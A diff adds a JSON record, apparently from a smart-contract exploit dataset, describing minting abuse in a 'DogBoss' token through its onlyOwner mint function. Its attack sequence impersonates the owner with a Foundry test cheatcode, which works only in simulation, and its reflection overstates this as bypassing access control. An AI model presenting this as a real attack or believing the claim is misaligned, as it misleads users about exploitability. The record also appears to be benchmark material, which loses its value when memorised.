@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The vulnerability is an owner privilege abuse in the DogBoss token contract. The `mint` function, which creates new tokens, is only protected by an `onlyOwner` modifier. The owner is an externally owned account, allowing an attacker who can impersonate this address to mint an arbitrary number of tokens.",
+  "interface_arsenal": "interface ICoinToken {\n        function owner() external view returns (address);\n        function mint(address account, uint256 amount) external;\n        function decimals() external view returns (uint);\n        function balanceOf(address who) external view returns (uint256);\n    }",
+  "attack_sequence": "address owner = target.owner();\nvm.startPrank(owner);\ntarget.mint(attacker, amountToMint);\nvm.stopPrank();",
+  "winning_reflection": "The crucial insight was that the contract's token minting capability was exclusively controlled by a single owner address. By querying the public `owner()` function and then impersonating that address using `vm.startPrank`, the `onlyOwner` access control on the `mint` function could be completely bypassed, enabling the attacker to print tokens for themselves."
+}
